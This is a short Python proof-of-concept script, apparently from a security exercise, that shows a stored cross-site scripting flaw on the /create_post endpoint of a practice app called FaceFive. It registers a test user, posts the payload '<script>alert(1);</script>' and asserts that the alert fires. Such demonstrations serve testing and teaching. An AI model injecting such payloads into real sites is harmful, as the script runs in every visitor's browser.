# vuln3.py

# PoC for Cross-Site Scripting on the /create_post endpoint
#
# When creating a new post, an attack insert a script in the content area which will run to all users viewing the post

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'
content = '<script>alert(1);</script>'

reset_image(session)
register(session, user, passwd)

alertText = create_post_script(session, content)
assert "1" in alertText
